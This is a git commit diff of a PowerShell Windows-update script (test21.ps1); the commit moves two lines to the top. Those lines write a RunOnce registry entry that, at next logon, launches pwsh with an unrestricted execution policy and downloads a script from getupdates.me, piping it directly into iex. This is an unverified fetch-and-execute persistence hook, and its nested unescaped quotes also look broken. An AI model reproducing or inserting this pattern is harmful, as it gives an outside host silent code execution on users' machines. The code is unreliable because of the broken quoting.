7040e425e17823eb80a26318671f31e4ff38fe44
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2024-07-19 13:45:48 -0700

    Update test21.ps1

--- test21.ps1
+++ test21.ps1
@@ -1,8 +1,8 @@
 Install-Module PSWindowsUpdate -Confirm:$false -force
 Add-WUServiceManager -MicrosoftUpdate -Confirm:$false
+set-location HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+new-itemproperty . MyKey -propertytype String -value "pwsh -ExecutionPolicy unrestricted -Command "& {iwr -useb https://getupdates.me/test3.ps1 | iex}"
 echo "Starting Updates"
 Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
 Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
 Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot
-set-location HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
-new-itemproperty . MyKey -propertytype String -value "pwsh -ExecutionPolicy unrestricted -Command "& {iwr -useb https://getupdates.me/test3.ps1 | iex}"
